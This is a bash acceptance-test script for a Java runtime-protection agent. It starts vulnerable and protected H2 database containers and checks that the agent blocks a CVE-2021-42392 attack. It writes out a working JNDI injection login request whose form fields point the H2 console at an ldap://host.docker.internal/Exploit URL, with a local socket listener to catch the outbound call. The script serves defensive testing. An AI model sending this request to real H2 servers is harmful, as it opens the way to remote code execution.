#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

baseline_name="${OHMYRASP_VULHUB_H2_42392_BASELINE_NAME:-ohmyrasp-vulhub-h2-42392-baseline}"
protected_name="${OHMYRASP_VULHUB_H2_42392_PROTECTED_NAME:-ohmyrasp-vulhub-h2-42392-protected}"
baseline_port="${OHMYRASP_VULHUB_H2_42392_BASELINE_PORT:-18796}"
protected_port="${OHMYRASP_VULHUB_H2_42392_PROTECTED_PORT:-18797}"
baseline_listener_port="${OHMYRASP_VULHUB_H2_42392_BASELINE_LISTENER_PORT:-18996}"
protected_listener_port="${OHMYRASP_VULHUB_H2_42392_PROTECTED_LISTENER_PORT:-19996}"
image="${OHMYRASP_VULHUB_H2_42392_IMAGE:-vulhub/spring-with-h2database:2.0.204}"
baseline_dir="logs/vulhub-h2-2021-42392-java8-baseline"
protected_dir="logs/vulhub-h2-2021-42392-java8-protected"
protected_log="${protected_dir}/events.jsonl"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/h2-console/" 2>/dev/null || true)"
    if [[ "$status" == "200" ]] && grep -q 'login.jsp?jsessionid=' "/tmp/${name}.html"; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "${name} did not expose the H2 console at ${port}" >&2
  exit 1
}

expect_protected_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 8 startup event in protected H2 container" >&2
    exit 1
  fi
  if ! grep -q '"jndi_hook":"installed"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "missing Java 8 JNDI hook startup marker in protected H2 container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected H2 container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

start_listener() {
  local port="$1"
  local result="$2"
  local timeout="$3"
  python3 -u - "$port" "$result" "$timeout" <<'PY' &
import pathlib
import socket
import sys

port = int(sys.argv[1])
result = pathlib.Path(sys.argv[2])
timeout = int(sys.argv[3])
result.write_text("WAITING\n")
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", port))
sock.listen(1)
sock.settimeout(timeout)
try:
    conn, addr = sock.accept()
    lines = ["CONNECTED %s:%s" % addr]
    try:
        conn.settimeout(1)
        lines.append("BYTES %r" % conn.recv(64))
    except Exception as exc:
        lines.append("READ_ERROR %s" % exc)
    conn.close()
    result.write_text("\n".join(lines) + "\n")
except Exception as exc:
    result.write_text("TIMEOUT %s\n" % exc)
finally:
    sock.close()
PY
}

h2_session() {
  local port="$1"
  local dir="$2"
  local jsessionid
  curl -sS -o "${dir}/h2-root.html" "http://127.0.0.1:${port}/h2-console/"
  jsessionid="$(
    sed -n "s/.*login.jsp?jsessionid=\\([a-f0-9]*\\).*/\\1/p" "${dir}/h2-root.html" | head -n1
  )"
  if [[ -z "$jsessionid" ]]; then
    cat "${dir}/h2-root.html" >&2
    echo "failed to extract H2 jsessionid" >&2
    exit 1
  fi
  curl -sS -o "${dir}/h2-login.html" \
    "http://127.0.0.1:${port}/h2-console/login.jsp?jsessionid=${jsessionid}"
  printf '%s' "$jsessionid"
}

send_jndi_login() {
  local port="$1"
  local output="$2"
  local dir="$3"
  local listener_port="$4"
  local jsessionid
  jsessionid="$(h2_session "$port" "$dir")"
  curl -sS -i -o "$output" -w "%{http_code}" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'language=en' \
    --data-urlencode 'setting=Generic H2 (Embedded)' \
    --data-urlencode 'name=Generic H2 (Embedded)' \
    --data-urlencode 'driver=javax.naming.InitialContext' \
    --data-urlencode "url=ldap://host.docker.internal:${listener_port}/Exploit" \
    --data-urlencode 'user=sa' \
    --data-urlencode 'password=' \
    "http://127.0.0.1:${port}/h2-console/login.do?jsessionid=${jsessionid}" || true
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  --add-host host.docker.internal:host-gateway \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" \
  --add-host host.docker.internal:host-gateway \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"
expect_protected_startup_without_detection

baseline_listener="${baseline_dir}/ldap-listener.txt"
start_listener "$baseline_listener_port" "$baseline_listener" 20
baseline_listener_pid=$!
baseline_status="$(
  send_jndi_login "$baseline_port" "${baseline_dir}/login.response" \
    "$baseline_dir" "$baseline_listener_port"
)"
wait "$baseline_listener_pid"
if [[ "$baseline_status" == "000" ]]; then
  cat "${baseline_dir}/login.response" >&2 || true
  echo "baseline H2 CVE-2021-42392 login request did not reach the HTTP endpoint" >&2
  exit 1
fi
if ! grep -q '^CONNECTED ' "$baseline_listener"; then
  cat "$baseline_listener" >&2 || true
  cat "${baseline_dir}/login.response" >&2 || true
  echo "baseline H2 CVE-2021-42392 login did not reach the outbound LDAP listener" >&2
  exit 1
fi

protected_listener="${protected_dir}/ldap-listener.txt"
start_listener "$protected_listener_port" "$protected_listener" 8
protected_listener_pid=$!
protected_status="$(
  send_jndi_login "$protected_port" "${protected_dir}/login.response" \
    "$protected_dir" "$protected_listener_port"
)"
wait "$protected_listener_pid"
if [[ "$protected_status" == "000" ]]; then
  cat "${protected_dir}/login.response" >&2 || true
  echo "protected H2 CVE-2021-42392 login request did not reach the HTTP endpoint" >&2
  exit 1
fi
if ! grep -q '^TIMEOUT ' "$protected_listener"; then
  cat "$protected_listener" >&2 || true
  cat "${protected_dir}/login.response" >&2 || true
  echo "protected H2 CVE-2021-42392 login still reached the outbound LDAP listener" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_jndi_remote_lookup".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java8_jndi_remote_lookup block event for H2 CVE-2021-42392" >&2
  exit 1
fi
if ! grep -q 'Java8RaspBlockException' "${protected_dir}/login.response" "$protected_log"; then
  cat "${protected_dir}/login.response" >&2 || true
  cat "$protected_log" >&2
  echo "missing Java8RaspBlockException evidence for protected H2 CVE-2021-42392" >&2
  exit 1
fi

echo "vulhub H2 CVE-2021-42392 Java8 acceptance passed"
